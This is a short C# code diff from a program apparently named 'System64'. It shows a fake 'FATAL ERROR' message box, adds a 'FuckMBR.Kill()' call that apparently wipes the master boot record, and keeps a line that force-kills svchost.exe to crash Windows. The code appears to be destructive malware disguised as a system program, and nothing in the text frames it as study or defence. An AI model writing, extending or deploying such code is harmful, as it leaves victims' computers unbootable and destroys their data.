@@ -91,6 +91,7 @@ namespace System64
 		void StartOperation()
 		{
 			MessageBox.Show("FATAL ERROR IN ADRESS 0x00000007", "FATAL ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			FuckMBR.Kill();
 			timer2.Start();
 		}
 
@@ -101,7 +102,6 @@ namespace System64
 			{
 				timer2.Stop();
 				
-				//KILL MBR
 				Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
 			}
 		}
